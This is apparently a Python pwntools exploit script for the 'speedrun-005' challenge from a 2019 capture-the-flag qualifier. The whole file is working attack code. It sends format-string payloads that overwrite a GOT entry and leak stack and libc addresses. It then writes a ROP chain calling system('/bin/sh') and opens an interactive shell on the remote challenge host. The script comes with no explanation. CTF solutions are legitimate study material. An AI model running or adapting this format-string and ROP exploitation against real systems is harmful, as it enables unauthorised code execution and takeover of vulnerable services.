import fmtcraft
import time
from pwn import *
context.arch='amd64'
context.log_level='debug'
def cal(a,b):
	if (a-b)>0:
		return a-b
	else:
		return a-b+0x10000
def setvalue(address,value):
	p1=value&0xffff
	p2=(value&0xffff0000)>>16
	p3=(value&0xffffffff00000000)>>32
	pay="%{}c%{}$hn%{}c%{}$hn%{}c%{}$hn".format(p1,39,cal(p2,p1),40,cal(p3,p2),38).ljust(0x100,'\x00')+p64(address+4)+p64(address)+p64(address+2)
	p.sendlineafter("? ",pay)


libc=ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
exp=1
local=0
if local:
	ret=0x0000000004007e4
	rdi=0x0000000004007E3
	got=0x000000000601018
	reuse=0x69d
	p=process('./speedrun-005')
else:
	ret=0x0000000000400894
	rdi=0x0000000000400893
	got=0x000000000601020
	reuse=0x72d
	p=remote("speedrun-005.quals2019.oooverflow.io",31337)
if exp:
	pay="%{}$n%{}c%{}$hn%{}c%{}$hn|%1$p|%2$p|".format(38,0x40,40,reuse-0x40,39).ljust(0x100,'\x00')+p64(got+4)+p64(got)+p64(got+2)
	p.sendlineafter("? ",pay)
	p.readuntil("|")
	stack=int(p.readuntil("|")[:-1],16)
	base=int(p.readuntil("|")[:-1],16)-(0x7ffff7dd18c0-0x7ffff79e4000)
	log.info(hex(stack))
	log.info(hex(base))
	# set value
	libc.address=base
	aim=0x7fffffffdfa8-0x7fffffffb4f0+stack
	address=aim
	sh=libc.search('/bin/sh').next()
	sys=libc.sym['system']
	puts=libc.sym['puts']
	data = {aim:rdi,aim+8:sh,aim+0x10:ret,aim+0x18:sys,got:puts}
	pay=fmtcraft.fmtstr(6,data,space=0x200)
	#gdb.attach(p)
	p.sendlineafter("? ",pay)
	p.interactive()

